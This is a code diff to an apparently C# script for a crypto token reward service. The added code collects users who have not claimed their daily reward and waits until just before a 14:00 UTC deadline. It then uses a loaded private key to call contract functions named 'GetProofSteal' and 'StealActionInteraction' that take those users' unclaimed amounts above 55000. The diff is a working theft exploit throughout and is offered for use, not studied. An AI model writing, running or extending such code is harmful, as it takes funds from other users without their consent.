@@ -5,7 +5,8 @@ var configs = new SettingsLoader();
 
 var fileWriter = new FindTreeFileManager("IdsNotClaimedToday.txt");
 var httpClients = new HttpClientFactory(configs.GetValue("AuthToken"));
-
+var settings = new SettingsLoader();
+var contract = new SmartContractInteraction(settings.GetValue("PrivateKey"));
 async Task<List<UserActivityDTO?>> DoFetchPage(int page)
 {
     var mintClient = new MintRequestSender(httpClients.GetDefaultHttpClient());
@@ -47,6 +48,24 @@ async Task<UserActivityDTO?> DoCheckUser(HttpClient client, UserLeaderboard user
     return null;
 }
 
+async Task DoClaim(HttpClient client, string id)
+{
+    MintRequestSender mintClient = new MintRequestSender(client);
+
+    var idNumber = Int32.Parse(id);
+    
+    var proofModel = await mintClient.GetProofSteal(idNumber);
+    if (proofModel is { Result.Amount: > 55000 })
+    {
+        Console.WriteLine($"Proof {proofModel.Result.Tx.Substring(0, 30)} {proofModel.Result.Amount}ME");
+        var isDone = await contract.StealActionInteraction(proofModel);
+        if (isDone)
+        {
+            Console.WriteLine(proofModel.Result.Amount != 0 ? $"Steel  id {id}: {proofModel.Result.Amount}ME" : "Null");   
+        }
+    }
+}
+
 try
 {
     List<Task<List<UserActivityDTO>>> tasks = new List<Task<List<UserActivityDTO>>>();
@@ -62,8 +81,30 @@ try
     var allUsers = users.SelectMany(x => x.Select(user => user))
         .OrderByDescending(x => Int32.Parse(x.Amount))
         .ToList();
-
+    
+    await Task.WhenAll(tasks);
     fileWriter.WriteUsers(allUsers);
+    
+    
+    var dateTimeNow = DateTime.UtcNow;
+    var deadLineTime = DateTime.Parse($"{dateTimeNow.Year}-{dateTimeNow.Month}-{dateTimeNow.Day} {14}:{00}:{00}")
+        .AddMilliseconds(-200)
+        .ToUniversalTime();
+    while (DateTime.UtcNow < deadLineTime)
+    {
+        Console.Clear();
+        Console.WriteLine(DateTime.UtcNow.ToString("HH:mm:ss") + $" Target {deadLineTime:HH:mm:ss}");
+        await Task.Delay(10);
+    }
+    
+    var steelTasks = new List<Task>();
+    foreach (var user in allUsers)
+    {
+        var task = DoClaim(httpClients.GetDefaultHttpClient(), user.Id);
+        steelTasks.Add(task);
+        await Task.Delay(150);
+    }
+    await Task.WhenAll(steelTasks);
 }
 catch (Exception e)
 {
